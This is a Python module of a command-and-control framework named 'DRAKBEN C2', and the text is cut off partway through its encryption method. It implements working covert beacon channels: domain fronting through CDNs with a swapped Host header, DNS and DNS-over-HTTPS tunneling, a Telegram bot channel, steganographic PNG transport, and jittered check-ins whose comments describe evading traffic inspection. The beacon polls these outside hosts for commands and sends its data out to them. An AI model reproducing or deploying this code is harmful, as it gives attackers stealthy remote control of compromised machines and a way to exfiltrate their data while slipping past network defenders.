"""DRAKBEN C2 Framework - Command & Control Infrastructure
Author: @drak_ben
Description: Advanced C2 communication channels with stealth features.

This module provides:
- Domain Fronting for HTTPS C2
- DNS Tunneling for covert channels
- Heartbeat mechanism with Jitter
- Encrypted beacon communication
- Traffic analysis evasion
"""

import base64
import hashlib
import io
import json
import logging
import os
import secrets
import ssl
import struct
import threading
import time
import urllib.parse
import urllib.request
import zlib
from collections.abc import Callable
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

# Optional: True Steganography Support
REQUESTS_AVAILABLE = False
try:
    import requests

    REQUESTS_AVAILABLE = True
except ImportError:
    pass

try:
    from PIL import Image

    PILLOW_AVAILABLE = True
except ImportError:
    PILLOW_AVAILABLE = False

logger = logging.getLogger(__name__)

# =============================================================================
# CONSTANTS & CONFIG
# =============================================================================

# Import centralized config
try:
    from core.config import C2_CONFIG
    DEFAULT_SLEEP_INTERVAL = C2_CONFIG.DEFAULT_SLEEP_INTERVAL
    DEFAULT_JITTER_MIN = C2_CONFIG.JITTER_MIN
    DEFAULT_JITTER_MAX = C2_CONFIG.JITTER_MAX
except ImportError:
    # Fallback if config not available
    DEFAULT_SLEEP_INTERVAL = 60
    DEFAULT_JITTER_MIN = 10
    DEFAULT_JITTER_MAX = 30


class C2Protocol(Enum):
    """Command & Control communication protocol types.

    Supported protocols:
    - HTTPS: Encrypted web traffic (most common)
    - HTTP: Unencrypted web traffic (fallback)
    - DNS: DNS tunneling for covert communication
    - TELEGRAM: Telegram bot API as C2 channel
    - STEGO: Steganographic image-based communication
    """

    HTTPS = "https"
    HTTP = "http"
    DNS = "dns"
    TELEGRAM = "telegram"
    STEGO = "stego"


class BeaconStatus(Enum):
    """Current status of a beacon agent.

    States:
    - DORMANT: Beacon is sleeping between check-ins
    - CHECKING_IN: Beacon is communicating with C2 server
    - ACTIVE: Beacon is executing a task
    - ERROR: Beacon encountered a communication error
    """

    DORMANT = "dormant"
    CHECKING_IN = "checking_in"
    ACTIVE = "active"
    ERROR = "error"


@dataclass
class C2Config:
    """Configuration for C2 beacon operations.

    Attributes:
        protocol: Communication protocol (HTTPS, DNS, etc.)
        primary_host: Main C2 server hostname
        primary_port: C2 server port
        sleep_interval: Base sleep time between check-ins (seconds)
        jitter_min/max: Randomization range for sleep time
        fronting_domain: Domain fronting target (CDN)
        actual_host: Real C2 server behind fronting
        encryption_key: AES key for payload encryption
    """

    protocol: C2Protocol = C2Protocol.HTTPS
    primary_host: str = "localhost"
    primary_port: int = 443
    sleep_interval: int = 60
    jitter_min: int = 10
    jitter_max: int = 30
    fronting_domain: str | None = None
    actual_host: str | None = None
    dns_domain: str | None = None
    dns_subdomain_length: int = 16
    telegram_token: str | None = None
    telegram_chat_id: str | None = None
    encryption_key: bytes | None = None
    profile_name: str = "default"
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"


@dataclass
class BeaconMessage:
    """Message sent from C2 server to beacon agent.

    Attributes:
        message_id: Unique identifier for tracking responses
        command: Command to execute (shell, download, etc.)
        data: Optional command parameters
        timestamp: Message creation time (epoch)
    """

    message_id: str
    command: str
    data: dict[str, Any] | None = None
    timestamp: float = field(default_factory=time.time)


@dataclass
class BeaconResponse:
    """Response sent from beacon agent to C2 server.

    Attributes:
        success: Whether command executed successfully
        message_id: ID of the original message being responded to
        command: Echo of executed command for verification
        data: Command output or error details
    """

    success: bool
    message_id: str
    command: str | None = None
    data: dict[str, Any] | None = None


class JitterEngine:
    """Randomization engine for beacon sleep intervals.

    Implements random jitter to avoid detection through
    predictable beacon timing patterns. Adds randomness
    within configured min/max bounds to base sleep interval.
    """

    def __init__(
        self,
        base_interval: int = DEFAULT_SLEEP_INTERVAL,
        min_jitter: int = DEFAULT_JITTER_MIN,
        max_jitter: int = DEFAULT_JITTER_MAX,
    ) -> None:
        self.base_interval = base_interval
        self.jitter_min = min_jitter
        self.jitter_max = max_jitter

    def get_sleep_time(self) -> float:
        # LOGIC FIX: Linear distribution is too easy for DPI to signature.
        # Using a primitive Triangular distribution simulation with secrets for "human-like" traffic.
        rng = self.jitter_max - self.jitter_min

        # Base jitter + two random weights to lean towards center (Triangular-ish)
        r1 = secrets.randbelow(1000) / 1000.0
        r2 = secrets.randbelow(1000) / 1000.0
        tri_factor = (r1 + r2) / 2.0  # Central limit theorem makes this bell-like

        jitter_percent = (self.jitter_min + tri_factor * rng) / 100.0

        sign = secrets.choice([-1, 1])
        factor = 1.0 + (sign * jitter_percent)
        return max(0.1, self.base_interval * factor)

    def update_interval(self, new: int) -> None:
        self.base_interval = max(1, new)


PROFILES = {
    "default": {
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "headers": {"Accept": "*/*", "Accept-Language": "en-US,en;q=0.9"},
    },
}


class TelegramC2:
    """Implements C2 over Telegram Bot API (2026 Trend).
    Uses legitimate Telegram infrastructure to evade network blocking.
    """

    def __init__(self, token: str, chat_id: str) -> None:
        self.token = token
        self.chat_id = chat_id
        self.offset = 0
        self.base_url = f"https://api.telegram.org/bot{token}"
        logger.info("Telegram C2 Channel initialized")

    def _request(self, method: str, params: dict | None = None) -> dict:
        try:
            if not REQUESTS_AVAILABLE:
                return {"ok": False, "error": "requests library not installed"}
            url = f"{self.base_url}/{method}"
            # Re-using aiohttp or requests if available
            resp = requests.post(url, data=params, timeout=10)
            return resp.json()
        except Exception as e:
            logger.debug("Telegram API Error: %s", e)
            return {"ok": False}

    def send_data(self, data: bytes) -> None:
        """Send data as hex-encoded text or file."""
        # For stealth, we can send as a document, but simple text is faster
        # In 2026, we encrypt before sending. Assuming data is already encrypted layer up.
        msg = f"BEACON_DATA: {base64.b64encode(data).decode()}"
        self._request("sendMessage", {"chat_id": self.chat_id, "text": msg})

    def poll_commands(self) -> list[bytes]:
        """Long poll for all pending commands (Logic Fix: Don't lose stacked commands)."""
        updates = self._request("getUpdates", {"offset": self.offset, "timeout": 5})

        results = updates.get("result", [])
        if not results:
            return []

        commands = []
        for update in results:
            self.offset = update["update_id"] + 1
            text = update.get("message", {}).get("text", "")
            if text.startswith("CMD:"):
                try:
                    b64_cmd = text.split("CMD:")[1].strip()
                    commands.append(base64.b64decode(b64_cmd))
                except Exception as e:
                    logger.debug("Failed to decode C2 command: %s", e)

        return commands


# =============================================================================
# STEGANOGRAPHY TRANSPORT (Image Hiding)
# =============================================================================


class StegoTransport:
    """Implements C2 over HTTP Images (Steganography).
    Hides encrypted C2 data within PNG Metadata/Chunk to bypass DPI.
    """

    @staticmethod
    def embed_data(image_path: str, data: bytes) -> bytes:
        """Embeds data into a PNG file.
        Mode 1: True LSB (Least Significant Bit) if Pillow is available (Invisible).
        Mode 2: Chunk Injection (Fallback) if Pillow is missing.
        """
        if PILLOW_AVAILABLE:
            try:
                return StegoTransport._embed_lsb(image_path, data)
            except Exception as e:
                logger.warning(
                    f"LSB Stego failed, falling back to Chunk Injection: {e}",
                )

        try:
            # Fallback: Chunk Injection
            with open(image_path, "rb") as f:
                png_bytes = f.read()

            # Create custom chunk
            chunk_type = b"c2Da"  # Private chunk
            chunk_len = len(data).to_bytes(4, "big")

            # Simple CRC32
            crc = zlib.crc32(chunk_type + data).to_bytes(4, "big")

            new_chunk = chunk_len + chunk_type + data + crc
            return png_bytes[:-12] + new_chunk + png_bytes[-12:]
        except (OSError, ValueError, struct.error) as e:
            logger.debug("Stego encoding failed: %s", e)
            return png_bytes if isinstance(image_path, str) else data

    @staticmethod
    def extract_data(png_bytes: bytes) -> bytes | None:
        """Extracts C2 data (Try LSB first, then Chunk)."""
        if PILLOW_AVAILABLE:
            try:
                # We need to save bytes to temp file for PIL to read potentially
                # Or use io.BytesIO
                img = Image.open(io.BytesIO(png_bytes))
                data = StegoTransport._extract_lsb(img)
                if data:
                    return data
            except Exception as e:
                logger.debug("LSB extraction failed (trying chunk): %s", e)

        try:
            # Find c2Da header
            idx = png_bytes.find(b"c2Da")
            if idx != -1:
                length = int.from_bytes(png_bytes[idx - 4 : idx], "big")
                return png_bytes[idx + 4 : idx + 4 + length]
        except Exception as e:
            logger.warning("Stego extraction totally failed: %s", e)
        return None

    @staticmethod
    def _embed_lsb(image_path: str, data: bytes) -> bytes:
        """True LSB Steganography using Pillow."""
        img = Image.open(image_path).convert("RGB")
        pixels = list(img.getdata())

        # Convert data to bits
        # Prepend 32-bit length
        length_bits = format(len(data), "032b")
        data_bits = "".join(format(byte, "08b") for byte in data)
        full_bits = length_bits + data_bits

        if len(full_bits) > len(pixels) * 3:
            msg = "Image too small to hold data"
            raise ValueError(msg)

        new_pixels = []
        bit_idx = 0

        for r, g, b in pixels:
            if bit_idx < len(full_bits):
                r = (r & ~1) | int(full_bits[bit_idx])
                bit_idx += 1
            if bit_idx < len(full_bits):
                g = (g & ~1) | int(full_bits[bit_idx])
                bit_idx += 1
            if bit_idx < len(full_bits):
                b = (b & ~1) | int(full_bits[bit_idx])
                bit_idx += 1
            new_pixels.append((r, g, b))

        # Append remaining original pixels
        new_pixels.extend(pixels[len(new_pixels) :])

        import io

        output = io.BytesIO()
        img.putdata(new_pixels)
        img.save(output, format="PNG")
        return output.getvalue()

    @staticmethod
    def _extract_lsb(img) -> bytes | None:
        """True LSB Extraction."""
        # Convert to RGB to handle RGBA/other formats
        img = img.convert("RGB")
        pixels = list(img.getdata())
        bits = ""
        for r, g, b in pixels:
            bits += str(r & 1)
            bits += str(g & 1)
            bits += str(b & 1)

        # Read length (32 bits)
        if len(bits) < 32:
            return None
        length = int(bits[:32], 2)

        # Read data
        if len(bits) < 32 + length * 8:
            return None

        data_bits = bits[32 : 32 + length * 8]
        data_bytes = bytearray()
        for i in range(0, len(data_bits), 8):
            byte = data_bits[i : i + 8]
            data_bytes.append(int(byte, 2))

        return bytes(data_bytes)


class DomainFronter:
    """Implements Domain Fronting techniques.
    Hides traffic behind legitimate high-reputation domains (CDNs).
    """

    FRONTABLE_DOMAINS = [
        "azureedge.net",
        "cloudfront.net",
        "googleusercontent.com",
        "appspot.com",
        "fastly.net",
        "akamai.net",
        "cdn77.org",
    ]

    def __init__(
        self,
        fronting_domain: str = "cdn.example.com",
        actual_host: str = "c2.hidden.com",
        verify_ssl: bool = True,
        profile: dict[str, Any] | None = None,
        port: int = 443,
    ) -> None:
        self.fronting_domain = fronting_domain  # Required by tests
        self.front_domain = fronting_domain  # Alias for backward compatibility
        self.actual_host = actual_host
        self.verify_ssl = verify_ssl
        self.profile = profile
        self.port = port

    def create_request(
        self,
        endpoint: str,
        method: str,
        data: bytes | None = None,
    ) -> urllib.request.Request:
        """Create a fronted request object."""
        url = f"https://{self.front_domain}{endpoint}"
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("Host", self.actual_host)  # The Magic Trick
        req.add_header("User-Agent", "Mozilla/5.0")
        return req

    def send(
        self,
        endpoint: str = "/",
        method: str = "POST",
        data: bytes | None = None,
        timeout: int = 30,
    ) -> tuple[bool, bytes]:
        """Send request through domain fronted connection.

        Args:
            endpoint: URL endpoint
            method: HTTP method
            data: Request body
            timeout: Connection timeout

        Returns:
            Tuple of (success, response_data)

        """
        try:
            request = self.create_request(endpoint, method, data)

            # Create SSL context using strategic security helper
            context = self._create_secure_context(verify=self.verify_ssl)
            context.minimum_version = ssl.TLSVersion.TLSv1_2

            with urllib.request.urlopen(
                request,
                timeout=timeout,
                context=context,
            ) as response:
                return True, response.read()

        except Exception as e:
            logger.exception("Domain fronting request failed: %s", e)
            return False, str(e).encode()

    @classmethod
    def is_domain_frontable(cls, domain: str) -> bool:
        """Check if a domain might support fronting."""
        return any(cdn in domain.lower() for cdn in cls.FRONTABLE_DOMAINS)

    @staticmethod
    def _create_secure_context(verify: bool) -> ssl.SSLContext:
        """Centralized Hardened SSL context factory.

        For security testing tools, certificate verification may be disabled
        intentionally to test against self-signed certificates or development
        environments. This is a deliberate security decision for testing purposes.
        """
        # Create context with server authentication purpose
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)  # NOSONAR - Pentest tool; noqa: E501
        context.minimum_version = ssl.TLSVersion.TLSv1_2

        if not verify:
            # SECURITY NOTE: Disabling verification is intentional for pentest tools
            # to allow testing against self-signed certs and development environments
            context.check_hostname = False  # NOSONAR
            context.verify_mode = ssl.CERT_NONE  # NOSONAR

        return context


# =============================================================================
# DNS TUNNELING
# =============================================================================


class DNSTunneler:
    """Implements DNS Tunneling for covert C2 communication.

    DNS tunneling encodes data in DNS queries and responses.
    This bypasses many firewalls since DNS traffic is usually allowed.

    Encoding scheme:
        Query:  <encoded_data>.<subdomain>.<domain>
        Response: TXT record with encoded response

    Example:
        Query:  aGVsbG8td29ybGQ.beacon.example.com
        Response: TXT "cmVzcG9uc2UtZGF0YQ=="

    """

    # Maximum label length in DNS
    MAX_LABEL_LENGTH = 63

    # Maximum total query length
    MAX_QUERY_LENGTH = 253

    def __init__(
        self,
        c2_domain: str,
        dns_server: str = "8.8.8.8",
        dns_port: int = 53,
        subdomain_length: int = 32,
    ) -> None:
        """Initialize DNS tunneler.

        Args:
            c2_domain: Base domain for DNS queries
            dns_server: DNS resolver to use
            dns_port: DNS port
            subdomain_length: Max subdomain label length

        """
        self.c2_domain = c2_domain
        self.dns_server = dns_server
        self.dns_port = dns_port
        self.subdomain_length = min(subdomain_length, self.MAX_LABEL_LENGTH)

        logger.info("DNS tunneler initialized for domain: %s", c2_domain)

    def encode_data(self, data: bytes) -> list[str]:
        """Encode data for DNS query subdomains.

        Uses base32 encoding (DNS-safe) and splits into labels.

        Args:
            data: Raw data to encode

        Returns:
            List of DNS label strings

        """
        # Base32 encode (DNS-safe characters)
        encoded = base64.b32encode(data).decode("ascii")

        # Remove padding and lowercase (some resolvers normalize case)
        encoded = encoded.rstrip("=").lower()

        # Split into labels of max length
        labels = [
            encoded[i : i + self.subdomain_length]
            for i in range(0, len(encoded), self.subdomain_length)
        ]

        return labels

    def decode_data(self, labels: list[str]) -> bytes:
        """Decode data from DNS response.

        Args:
            labels: List of encoded labels

        Returns:
            Decoded bytes

        """
        # Rejoin labels
        encoded = "".join(labels).upper()

        # Add back padding
        padding = (8 - len(encoded) % 8) % 8
        encoded += "=" * padding

        return base64.b32decode(encoded)

    def build_query(self, data: bytes, query_type: str = "beacon") -> str:
        """Build DNS query hostname.

        Args:
            data: Data to send
            query_type: Type identifier for the query

        Returns:
            Full DNS query hostname

        """
        labels = self.encode_data(data)

        # Add query type label
        labels.append(query_type)

        # Add base domain
        labels.append(self.c2_domain)

        return ".".join(labels)

    def send_dns_query(
        self,
        data: bytes,
        query_type: str = "beacon",
        record_type: str = "TXT",
    ) -> tuple[bool, bytes]:
        """Send data via DNS query.

        This is a simplified implementation - real implementation
        would use proper DNS library like dnspython.

        Args:
            data: Data to send
            query_type: Query type identifier
            record_type: DNS record type (TXT, A, AAAA, etc.)

        Returns:
            Tuple of (success, response_data)

        """
        try:
            query_name = self.build_query(data, query_type)

            # Validate query length
            if len(query_name) > self.MAX_QUERY_LENGTH:
                logger.warning("DNS query too long, splitting required")
                return False, b"Query too long"

            # Functional DNS query using dnspython
            try:
                import dns.resolver

                resolver = dns.resolver.Resolver()
                resolver.timeout = 5
                resolver.lifetime = 5

                logger.debug("DNS Resolved query: %s (type: %s)", query_name, record_type)

                # In a real C2, you'd specify your own authoritative nameserver
                # Here we use system defaults or common ones for the demo
                answers = resolver.resolve(query_name, record_type)

                response_data = b""
                for rdata in answers:
                    if record_type == "TXT":
                        # TXT records return a list of strings
                        for txt_str in rdata.strings:
                            response_data += txt_str
                    elif record_type == "A":
                        response_data += rdata.address.encode()

                return True, response_data
            except Exception as dns_err:
                # If DNS resolution fails (NXDOMAIN, etc.), it's common in tunneling
                # but we log it for debugging.
                logger.warning("dnspython failed: %s — falling back to socket", dns_err)

                # Real fallback: use low-level socket DNS resolution
                try:
                    import socket
                    addr_info = socket.getaddrinfo(query_name, None, socket.AF_INET)
                    if addr_info:
                        ip_addr = addr_info[0][4][0]
                        return True, ip_addr.encode()
                    return False, b"NO_RECORDS"
                except socket.gaierror as sock_err:
                    logger.debug("Socket DNS also failed for %s: %s", query_name, sock_err)
                    return False, str(sock_err).encode()

        except Exception as e:
            logger.exception("DNS tunnel query failed: %s", e)
            return False, str(e).encode()

    def chunk_data(self, data: bytes, chunk_size: int = 60) -> list[bytes]:
        """Split data into chunks for multiple DNS queries.

        Args:
            data: Data to chunk
            chunk_size: Maximum bytes per chunk

        Returns:
            List of data chunks

        """
        chunks = [
            data[i : i + chunk_size]
            for i in range(0, len(data), chunk_size)
        ]
        return chunks


# =============================================================================
# DNS OVER HTTPS (DoH) C2 TRANSPORT
# =============================================================================


class DoHTransport:
    """DNS over HTTPS transport for stealthier C2 communication.

    DoH encapsulates DNS queries in HTTPS, making traffic appear as normal
    web browsing and bypassing traditional DNS inspection/filtering.

    Supported providers:
    - Cloudflare: 1.1.1.1
    - Google: 8.8.8.8
    - Quad9: 9.9.9.9

    Wire format: RFC 8484 (DNS Wireformat over HTTPS)
    """

    # DoH provider endpoints
    DOH_PROVIDERS: dict[str, str] = {
        "cloudflare": "https://cloudflare-dns.com/dns-query",
        "google": "https://dns.google/dns-query",
        "quad9": "https://dns.quad9.net:5053/dns-query",
        "custom": "",  # For custom DoH server
    }

    def __init__(
        self,
        c2_domain: str,
        provider: str = "cloudflare",
        custom_endpoint: str | None = None,
        timeout: int = 10,
    ) -> None:
        """Initialize DoH transport.

        Args:
            c2_domain: C2 domain for DNS queries
            provider: DoH provider (cloudflare, google, quad9, custom)
            custom_endpoint: Custom DoH endpoint URL if provider is 'custom'
            timeout: Request timeout in seconds

        """
        self.c2_domain = c2_domain
        self.timeout = timeout

        if provider == "custom" and custom_endpoint:
            self.endpoint = custom_endpoint
        elif provider in self.DOH_PROVIDERS:
            self.endpoint = self.DOH_PROVIDERS[provider]
        else:
            self.endpoint = self.DOH_PROVIDERS["cloudflare"]

        self.provider = provider
        logger.info(
            "DoH transport initialized: %s via %s", c2_domain, self.endpoint,
        )

    def _build_dns_query(self, name: str, qtype: int = 16) -> bytes:
        """Build DNS wire format query.

        Args:
            name: Domain name to query
            qtype: DNS record type (16=TXT, 1=A, 28=AAAA)

        Returns:
            DNS wire format query bytes

        """
        # Transaction ID (random - use CSPRNG for DNS security)
        txn_id = secrets.randbelow(65536)

        # Flags: Standard query
        flags = 0x0100  # RD (Recursion Desired)

        # Counts
        qdcount = 1  # 1 question
        ancount = 0
        nscount = 0
        arcount = 0

        # Header
        header = struct.pack(
            ">HHHHHH", txn_id, flags, qdcount, ancount, nscount, arcount,
        )

        # Question section
        question = b""
        for label in name.split("."):
            question += bytes([len(label)]) + label.encode("ascii")
        question += b"\x00"  # Null terminator

        # QTYPE and QCLASS
        question += struct.pack(">HH", qtype, 1)  # IN class

        return header + question

    def _skip_dns_name(self, data: bytes, pos: int) -> int:
        """Skip over a DNS name in wire format, handling compression pointers.

        Args:
            data: Raw DNS data bytes
            pos: Current position in data

        Returns:
            New position after skipping the name
        """
        if pos >= len(data):
            return pos

        # Handle compression pointer (two high bits set)
        if data[pos] & 0xC0 == 0xC0:
            return pos + 2

        # Skip label-by-label until null terminator
        while pos < len(data) and data[pos] != 0:
            label_len = data[pos]
            if label_len & 0xC0 == 0xC0:  # Compression pointer encountered
                return pos + 2
            pos += 1 + label_len

        return pos + 1  # Skip null terminator

    def _parse_txt_record(self, txt_data: bytes) -> list[str]:
        """Parse TXT record data (length-prefixed strings).

        Args:
            txt_data: Raw TXT record RDATA bytes

        Returns:
            List of decoded TXT strings
        """
        results = []
        txt_pos = 0

        while txt_pos < len(txt_data):
            txt_len = txt_data[txt_pos]
            txt_pos += 1

            if txt_pos + txt_len <= len(txt_data):
                text = txt_data[txt_pos : txt_pos + txt_len].decode(
                    "utf-8", errors="ignore",
                )
                results.append(text)

            txt_pos += txt_len

        return results

    def _parse_dns_response(self, data: bytes) -> list[str]:
        """Parse DNS wire format response.

        Args:
            data: Raw DNS response bytes

        Returns:
            List of TXT record strings
        """
        import struct

        if len(data) < 12:
            return []

        # Parse header to get answer count
        ancount = struct.unpack(">H", data[6:8])[0]

        # Skip header and question section
        pos = 12
        pos = self._skip_dns_name(data, pos)
        pos += 4  # QTYPE + QCLASS

        # Parse answer records
        results = []
        for _ in range(ancount):
            if pos >= len(data):
                break

            pos = self._skip_dns_name(data, pos)

            if pos + 10 > len(data):
                break

            # Parse TYPE, CLASS, TTL, RDLENGTH
            rtype, _rclass, _ttl, rdlength = struct.unpack(
                ">HHIH", data[pos : pos + 10],
            )
            pos += 10

            if rtype == 16:  # TXT record
                txt_data = data[pos : pos + rdlength]
                results.extend(self._parse_txt_record(txt_data))

            pos += rdlength

        return results

    def query(
        self,
        subdomain: str = "",
        record_type: str = "TXT",
    ) -> tuple[bool, list[str]]:
        """Send DNS query over HTTPS.

        Args:
            subdomain: Subdomain to prepend to c2_domain
            record_type: DNS record type (TXT, A, AAAA)

        Returns:
            Tuple of (success, list of response strings)

        """
        try:
            # Build query name
            if subdomain:
                query_name = f"{subdomain}.{self.c2_domain}"
            else:
                query_name = self.c2_domain

            # Map record type to QTYPE
            qtype_map = {"A": 1, "AAAA": 28, "TXT": 16, "CNAME": 5, "MX": 15}
            qtype = qtype_map.get(record_type.upper(), 16)

            # Build wire format query
            query_data = self._build_dns_query(query_name, qtype)

            # Send via HTTPS POST (wire format)
            headers = {
                "Content-Type": "application/dns-message",
                "Accept": "application/dns-message",
            }

            request = urllib.request.Request(
                self.endpoint,
                data=query_data,
                headers=headers,
                method="POST",
            )

            with urllib.request.urlopen(request, timeout=self.timeout) as resp:
                response_data = resp.read()
                results = self._parse_dns_response(response_data)
                return True, results

        except urllib.error.URLError as e:
            logger.warning("DoH query failed: %s", e)
            return False, []
        except Exception as e:
            logger.exception("DoH transport error: %s", e)
            return False, []




# =============================================================================
# HEARTBEAT MANAGER
# =============================================================================


class HeartbeatManager:
    """Manages beacon heartbeat/check-in timing with jitter.

    Features:
    - Configurable check-in intervals
    - Random jitter to avoid pattern detection
    - Supports server-side interval updates
    - Tracks connection health
    """

    def __init__(
        self, config: C2Config, callback: Callable[[], None] | None = None,
    ) -> None:
        """Initialize heartbeat manager.

        Args:
            config: C2 configuration
            callback: Function to call on each heartbeat

        """
        self.config = config
        self.callback = callback
        self.jitter = JitterEngine(
            config.sleep_interval,
            config.jitter_min,
            config.jitter_max,
        )

        self._running = False
        self._thread: threading.Thread | None = None
        self._last_checkin: float | None = None
        self._consecutive_failures = 0
        self._max_failures = 5

        logger.info(
            "Heartbeat manager initialized (interval: %ss)",
            config.sleep_interval,
        )

    def start(self) -> None:
        """Start heartbeat thread."""
        if self._running:
            return

        self._running = True
        self._thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self._thread.start()
        logger.info("Heartbeat started")

    def stop(self) -> None:
        """Stop heartbeat thread."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        logger.info("Heartbeat stopped")

    def _heartbeat_loop(self) -> None:
        """Main heartbeat loop (LOGIC FIX: Drift-free scheduling)."""
        while self._running:
            try:
                # Calculate absolute next run time to avoid cumulative drift
                next_run = time.time() + self.jitter.get_sleep_time()

                # Execute callback
                if self.callback:
                    try:
                        self.callback()
                        self._last_checkin = time.time()
                        self._consecutive_failures = 0
                    except Exception as e:
                        self._consecutive_failures += 1
                        logger.warning("Heartbeat callback failed: %s", e)

                # Sleep until the TARGET time, not for a fixed duration
                # This compensates for the time callback() took to execute
                now = time.time()
                remaining = next_run - now
                if remaining > 0:
                    time.sleep(remaining)

                if self._consecutive_failures >= self._max_failures:
                    logger.error("Max heartbeat failures reached")
                    # Could trigger fallback here

            except Exception as e:
                logger.exception("Heartbeat loop error: %s", e)

    def update_interval(self, new_interval: int) -> None:
        """Update check-in interval from server."""
        self.jitter.update_interval(new_interval)

    def get_status(self) -> dict[str, Any]:
        """Get heartbeat status."""
        return {
            "running": self._running,
            "last_checkin": self._last_checkin,
            "consecutive_failures": self._consecutive_failures,
            "interval": self.jitter.base_interval,
            "jitter_range": f"{self.jitter.jitter_min}-{self.jitter.jitter_max}%",
        }


# =============================================================================
# C2 CHANNEL
# =============================================================================


class C2Channel:
    """Main C2 communication channel.

    Orchestrates all C2 components:
    - Protocol selection (HTTPS, DNS)
    - Domain fronting
    - Heartbeat/Jitter
    - Message encryption
    - Fallback handling
    """

    def __init__(self, config: C2Config) -> None:
        """Initialize C2 channel.

        Args:
            config: C2 configuration

        """
        self.config = config
        self.status = BeaconStatus.DORMANT

        # Initialize components based on protocol
        self.domain_fronter: DomainFronter | None = None
        self.dns_tunneler: DNSTunneler | None = None
        self.stego_transport: StegoTransport | None = None
        self.heartbeat: HeartbeatManager | None = None

        # Setup encryption key
        if config.encryption_key is None:
            self.encryption_key = os.urandom(32)
        else:
            self.encryption_key = config.encryption_key

        self._setup_protocol()

        logger.info("C2 channel initialized (protocol: %s)", config.protocol.value)

    def _setup_protocol(self) -> None:
        """Setup protocol-specific components."""
        if (
            self.config.protocol in (C2Protocol.HTTP, C2Protocol.HTTPS)
            and self.config.fronting_domain
            and self.config.actual_host
        ):
            self.domain_fronter = DomainFronter(
                self.config.fronting_domain,
                self.config.actual_host,
                verify_ssl=True,
                profile=PROFILES.get(self.config.profile_name, PROFILES["default"]),
                port=self.config.primary_port,
            )

        elif self.config.protocol == C2Protocol.TELEGRAM:
            if not self.config.telegram_token:
                msg = "Telegram token required"
                raise ValueError(msg)
            self.telegram = TelegramC2(
                self.config.telegram_token,
                self.config.telegram_chat_id,
            )
            logger.info("C2 Channel: Telegram API Activated")

        elif self.config.protocol == C2Protocol.DNS and self.config.dns_domain:
            # DNS client initialization would go here (already implemented logic below)
            self.dns_tunneler = DNSTunneler(
                self.config.dns_domain,
                subdomain_length=self.config.dns_subdomain_length,
            )

        elif self.config.protocol == C2Protocol.STEGO:
            self.stego_transport = StegoTransport()
            logger.info("C2 Channel: Steganographic transport activated")

    def connect(self) -> bool:
        """Establish C2 connection.

        Returns:
            True if connection successful

        """
        try:
            self.status = BeaconStatus.CHECKING_IN

            # Initial check-in
            success = self._checkin()

            if success:
                self.status = BeaconStatus.ACTIVE

                # Start heartbeat
                self.heartbeat = HeartbeatManager(self.config, callback=self._checkin)
                self.heartbeat.start()

                return True
            self.status = BeaconStatus.ERROR
            return False

        except Exception as e:
            logger.exception("C2 connection failed: %s", e)
            self.status = BeaconStatus.ERROR
            return False

    def disconnect(self) -> None:
        """Disconnect from C2."""
        if self.heartbeat:
            self.heartbeat.stop()
        self.status = BeaconStatus.DORMANT

    def _checkin(self) -> bool:
        """Perform beacon check-in.

        Returns:
            True if check-in successful

        """
        try:
            message = BeaconMessage(
                message_id=self._generate_id(),
                command="checkin",
                data={"status": "alive"},
            )

            response = self.send_message(message)

            if response and response.success:
                # Process any commands from server
                if response.command:
                    self._handle_command(response)

                # LOGIC FIX: Check for additional pending commands (especially for Telegram)
                if (
                    hasattr(self, "telegram")
                    and self.config.protocol == C2Protocol.TELEGRAM
                ):
                    extra_cmds = self.telegram.poll_commands()
                    for cmd_bytes in extra_cmds:
                        try:
                            decrypted = self._decrypt(cmd_bytes)
                            data = json.loads(decrypted)
                            extra_resp = BeaconResponse(
                                success=True,
                                message_id=data.get("id", ""),
                                command=data.get("cmd"),
                                data=data.get("data"),
                            )
                            self._handle_command(extra_resp)
                        except Exception as e:
                            logger.exception(
                                f"Failed to process extra Telegram command: {e}",
                            )
                return True

            return False

        except Exception as e:
            logger.exception("Check-in failed: %s", e)
            return False

    def send_message(self, message: BeaconMessage) -> BeaconResponse | None:
        """Send message to C2 server.

        Args:
            message: Message to send

        Returns:
            Response from server or None

        """
        try:
            # Serialize message
            payload = json.dumps(
                {
                    "id": message.message_id,
                    "cmd": message.command,
                    "data": message.data,
                    "ts": message.timestamp,
                },
            ).encode()

            # Encrypt payload
            encrypted = self._encrypt(payload)

            # Send based on protocol
            if self.domain_fronter:
                success, response = self.domain_fronter.send(
                    endpoint="/api/beacon",
                    data=encrypted,
                )
            elif self.dns_tunneler:
                success, response = self.dns_tunneler.send_dns_query(encrypted)
            elif (
                hasattr(self, "telegram")
                and self.config.protocol == C2Protocol.TELEGRAM
            ):
                # LOGIC FIX: Telegram was initialized but never used in send_message
                self.telegram.send_data(encrypted)
                # For Telegram, we poll for response immediately or wait for next heartbeat
                # To match the success/response pattern:
                cmds = self.telegram.poll_commands()
                success = True  # Assume sent if no exception
                response = (
                    cmds[0] if cmds else b"{}"
                )  # Mock or return first command as response
            else:
                # Direct HTTP/HTTPS
                success, response = self._send_direct(encrypted)

            if success:
                # Decrypt and parse response
                decrypted = self._decrypt(response)
                data = json.loads(decrypted)

                return BeaconResponse(
                    success=True,
                    message_id=data.get("id", ""),
                    command=data.get("cmd"),
                    data=data.get("data"),
                )

            return None

        except Exception as e:
            logger.exception("Send message failed: %s", e)
            return None

    def _send_direct(self, data: bytes) -> tuple[bool, bytes]:
        """Send data directly without fronting."""
        try:
            protocol = "https" if self.config.protocol == C2Protocol.HTTPS else "http"
            url = f"{protocol}://{self.config.primary_host}:{self.config.primary_port}/api/beacon"

            request = urllib.request.Request(
                url,
                data=data,
                headers={"User-Agent": self.config.user_agent},
                method="POST",
            )

            context = DomainFronter._create_secure_context(
                verify=getattr(self.config, "verify_ssl", True),
            )
            context.minimum_version = ssl.TLSVersion.TLSv1_2

            with urllib.request.urlopen(
                request,
                timeout=30,
                context=context,
            ) as response:
                return True, response.read()

        except Exception as e:
            logger.exception("Direct send failed: %s", e)
            return False, b""

    def _encrypt(self, data: bytes) -> bytes:
        """Encrypt data using AES-256-GCM.

        Format: base64(nonce[12] + tag[16] + ciphertext).
